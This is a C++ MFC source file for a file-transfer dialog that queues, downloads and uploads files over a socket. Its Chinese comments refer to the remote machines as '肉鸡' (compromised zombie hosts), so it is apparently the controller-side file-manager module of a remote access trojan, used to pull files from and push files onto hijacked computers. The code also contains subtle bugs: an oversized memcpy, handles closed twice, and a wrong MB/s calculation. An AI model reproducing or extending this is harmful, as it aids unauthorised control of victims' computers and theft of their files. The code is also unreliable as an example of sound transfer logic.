// FileTrans.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "FileTrans.h"
#include "FileManager.h"
#include "BroilerData.h"

// CFileTrans 对话框

IMPLEMENT_DYNAMIC(CFileTrans, CDialog)

CFileTrans::CFileTrans(CWnd* pParent /*=NULL*/, SOCKET sock)
	: CDialog(CFileTrans::IDD, pParent)
{
	m_socket = sock;
	m_pWndMsg = pParent;
}

CFileTrans::~CFileTrans()
{
}

void CFileTrans::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_DOWNLOAD, m_listCtrl);
	DDX_Control(pDX, IDC_FILE_PROCESS, m_filePro);
}


BEGIN_MESSAGE_MAP(CFileTrans, CDialog)
END_MESSAGE_MAP()


// CFileTrans 消息处理程序
BOOL CFileTrans::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //如果按下的是回车键或ESC键，则截断消息
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CFileTrans::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
    DlgInit();
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CFileTrans::DlgInit()
{
	m_ImageList.Create(16, 16, ILC_COLOR24 | ILC_MASK, 1, 0);
	CBitmap bmp[2];
	bmp[0].LoadBitmap(IDB_BMP_DOWNLOAD);  //下载图标
    bmp[1].LoadBitmap(IDB_BMP_UPLOAD);   //上传图标
	for(int i = 0; i < 2 ; i++)
	{
		m_ImageList.Add(&bmp[i], RGB(255,255,255));
	}
	m_listCtrl.SetImageList(&m_ImageList, LVSIL_SMALL);

	m_listCtrl.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
	m_listCtrl.InsertColumn(0, _T("传输类型"), LVCFMT_LEFT, 60);
	m_listCtrl.InsertColumn(1, _T("源文件路径"), LVCFMT_LEFT, 230);
	m_listCtrl.InsertColumn(2, _T("目标文件路径"), LVCFMT_LEFT, 230);
	m_listCtrl.InsertColumn(3, _T("文件大小"), LVCFMT_LEFT, 70);

	m_filePro.SetRange(0, 100);  //进度条
	m_bBeginWork = false;
}

void CFileTrans::OnAddFileList(IN int nType, 
							   IN const CString strSourcePath,
							   IN const CString strDesPath,
							   IN const CString strSize,
							   IN const __int64* uSize)
{
	int iCount = m_listCtrl.GetItemCount();
	if (0 == nType)  //下载
	{
		m_listCtrl.InsertItem(iCount, FILE_ACTIVE_DOWNLOAD, 0);
	}
	else  //上传
	{
		m_listCtrl.InsertItem(iCount, FILE_ACTIVE_UPLOAD, 1);
	}
	m_listCtrl.SetItemText(iCount, 1, strSourcePath);  //源文件 (肉鸡上文件存放的路径)
	m_listCtrl.SetItemText(iCount, 2, strDesPath);     //目标文件(下载存放在本地的路径)
	m_listCtrl.SetItemText(iCount, 3, strSize);       //文件大小
	m_listCtrl.SetItemData(iCount, (DWORD)uSize);

	if (false == m_bBeginWork)
	{
		HANDLE hThread = CreateThread(NULL, 0, BeginToTransFileProc, (LPVOID)this, 0, NULL);  //创建文件传输的工作线程
		if (NULL != hThread)
		{
			m_bBeginWork = true;   //正在工作
			CloseHandle(hThread);
		}
	}
}

DWORD WINAPI CFileTrans::BeginToTransFileProc( LPVOID lpParameter )
{
	CFileTrans* pThis = (CFileTrans*)lpParameter;
	if (NULL != pThis)
	{
		pThis->TransFile();
	}
	return 0;
}

void CFileTrans::TransFile()
{
	m_filePro.SetPos(0);
	if (0 == m_listCtrl.GetItemCount())  //如果当前列表中文件数目都传完了
	{
		m_bBeginWork = false;
		return ;
	}
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	CString strActionType = _T("");  //是上传还是下载的行为
	strActionType = m_listCtrl.GetItemText(0, 0);
	wchar_t szDesPath[MAX_PATH];
	if (FILE_ACTIVE_DOWNLOAD == strActionType)  //下载
	{
		CString strLocationPath = m_listCtrl.GetItemText(0, 2);   //本地上的文件路径（待创建的）
		m_pFile = new CFile(strLocationPath, CFile::modeCreate | CFile::modeReadWrite);  //创建文件
		tagMsgInfo.nMsgCmd = CMD_DOWNLOAD;  //下载命令
		CString strDesPath = m_listCtrl.GetItemText(0, 1);  //肉鸡上文件的路径(需要将该文件路径发送过去)
		memset(szDesPath, 0, sizeof(szDesPath));
		memcpy(szDesPath, strDesPath.GetBuffer(0), sizeof(szDesPath));
		memcpy((char*)tagMsgInfo.context, (char*)szDesPath, sizeof(szDesPath));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);  //发送下载指定文件的命令
	}
	else if (FILE_ACTIVE_UPLOAD == strActionType)  //上传
	{
		tagMsgInfo.nMsgCmd = CMD_UPLOAD;  //上传命令
		CString strDesPath = m_listCtrl.GetItemText(0, 2);  //上传到肉鸡上的文件路径（待发送）
		memset(szDesPath, 0, sizeof(szDesPath));
		memcpy(szDesPath, strDesPath.GetBuffer(0), sizeof(szDesPath));
		memcpy((char*)tagMsgInfo.context, (char*)szDesPath, sizeof(szDesPath));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);  //发送上传文件指定文件的命令
		SendUploadFileInfo(m_socket);  //发送文件数据块
	}
	m_dwStartTime = ::GetTickCount();
}

void CFileTrans::SetFileData(IN DOWNFILEDATA_C tagDownFileData)
{
	CString strSpeed = _T("下载速率: ");
	if (tagDownFileData.bFlag)  //一个文件传输完毕
	{
		m_filePro.SetPos(100);
		m_pFile->Close(); //关闭文件
		::CloseHandle(m_pFile->m_hFile);
		delete m_pFile;
		m_listCtrl.DeleteItem(0);    //删除第一个
		HANDLE hThread = CreateThread(NULL, 0, BeginToTransFileProc, (LPVOID)this, 0, NULL);  //创建文件传输的工作线程
		if (NULL != hThread)
		{
			CloseHandle(hThread);
		}
		strSpeed += _T(" 0 KB/S");
	}
	else   //一个文件还没有传输完毕
	{
		float pos;  //进度条百分比
		m_pFile->Write((char*)tagDownFileData.context, tagDownFileData.size);  //写入文件
		pos = float(m_pFile->GetLength() * 1.0 / *(__int64*)m_listCtrl.GetItemData(0));
		m_filePro.SetPos(int(pos * 100));
		DWORD dwTime = ::GetTickCount() - m_dwStartTime;  //得到当前时间
		DWORD dwSize = m_pFile->GetLength();
		strSpeed += GetFileTranSpeed(dwSize, dwTime);
	}
	::SendMessage( ((CFileManager*)m_pWndMsg)->m_fileStatusBar, SB_SETTEXT, (WPARAM)1, (LPARAM)strSpeed.GetBuffer(0));
}

void CFileTrans::SendUploadFileInfo(IN SOCKET sock )
{
	const int nBufSize = 512;  //文件块大小
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_FILEUPLOAD;    //文件上传
	DOWNFILEDATA_C tagUploadFileData;
	memset(&tagUploadFileData, 0, sizeof(DOWNFILEDATA_C));
	tagUploadFileData.bFlag = false;

	CString strDesPath = m_listCtrl.GetItemText(0, 1);
	CFile file(strDesPath, CFile::modeRead);
	__int64 ullSize = file.GetLength();  //文件大小
	bool bSuccess = true;
    m_filePro.SetPos(0);   //进度条为0

	if (ullSize < nBufSize) //文件不足一个块
	{
		file.Read((char*)tagUploadFileData.context, (UINT)ullSize);
		tagUploadFileData.size = (UINT)ullSize;
		tagUploadFileData.nCount = 0;
		memcpy((char*)tagMsgInfo.context, (char*)&tagUploadFileData, sizeof(MSGINFO));
		m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
	} 
	else  //分块发送
	{
		__int64 ullCount = ullSize / nBufSize + 1;   //传送的次数
		int ullLastSize = ullSize % nBufSize;  //最后一次传输的字节数
		for (int i = 0; i < ullCount; i++)
		{
			memset(tagUploadFileData.context, 0, sizeof(tagUploadFileData.context));
			if ( i == ullCount - 1)  //最后一次传输文件
			{
				file.Read(tagUploadFileData.context, ullLastSize);
				tagUploadFileData.size = ullLastSize;
			}
			else
			{
				file.Read(tagUploadFileData.context, nBufSize);
				tagUploadFileData.size = nBufSize;
			}
			tagUploadFileData.nCount = i;
			memcpy((char*)tagMsgInfo.context, (char*)&tagUploadFileData, sizeof(DOWNFILEDATA_C));
			m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
			float pos = float((i + 1) * 1.0 /ullCount);
			m_filePro.SetPos(int(pos * 100));  //进度条的百分比
		}
	}
	m_filePro.SetPos(100);
	tagUploadFileData.bFlag = true;  //文件传输完毕
	memcpy((char*)tagMsgInfo.context, (char*)&tagUploadFileData, sizeof(tagUploadFileData));
	m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
	//关闭文件句柄
	file.Close();
	::CloseHandle(file.m_hFile);
	m_listCtrl.DeleteItem(0);
	HANDLE hThread = CreateThread(NULL, 0, BeginToTransFileProc, (LPVOID)this, 0, NULL);  //创建文件传输的工作线程
	if (NULL != hThread)
	{
		CloseHandle(hThread);
	}
}

//获取下载速度的字符串   
CString CFileTrans::GetFileTranSpeed(DWORD size,DWORD time)  
{  
	CString _speed;  
	//判断时间是否为0   
	if (time >0)
	{  
		if (size/1024*1000.0/time <1024)  
		{  
			_speed.Format(_T("%.2lfKB/s"),size/1024*1000.0/time);  
		}else   
		{     
			_speed.Format(_T("%.2lfMB/s"),(size/1024)*1000.0/time);  
		}  
	}
	else  
	{  
		return _speed = _T("0KB/s");  
	}  
	return _speed;  
}  

void CFileTrans::OnCancel()
{
	// TODO: 在此添加专用代码和/或调用基类
	DestroyWindow();
	delete this;
}

void CFileTrans::PostNcDestroy()
{
	// TODO: 在此添加专用代码和/或调用基类
	CDialog::PostNcDestroy();
	((CFileManager*)this->m_pWndMsg)->m_pFileTrans = NULL; 
}
